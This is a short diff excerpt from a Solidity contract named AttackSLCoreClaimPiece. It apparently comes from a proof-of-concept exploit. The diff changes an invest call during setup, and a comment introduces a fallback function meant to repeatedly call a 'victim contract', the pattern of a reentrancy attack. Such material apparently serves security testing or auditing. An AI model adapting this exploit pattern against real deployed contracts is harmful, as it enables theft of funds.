@@ -24,7 +24,7 @@ contract AttackSLCoreClaimPiece {
         approveERC20(paymentToken, spender, amount);
         approveERC20(paymentToken, investmentAddress, 5_000_000_000);
         slCore.mintEntry();
-        investment.invest(5_000, 0);
+        investment.invest(5_000, paymentToken);
     }
 
     // Fallback function to repeatedly call the victim contract
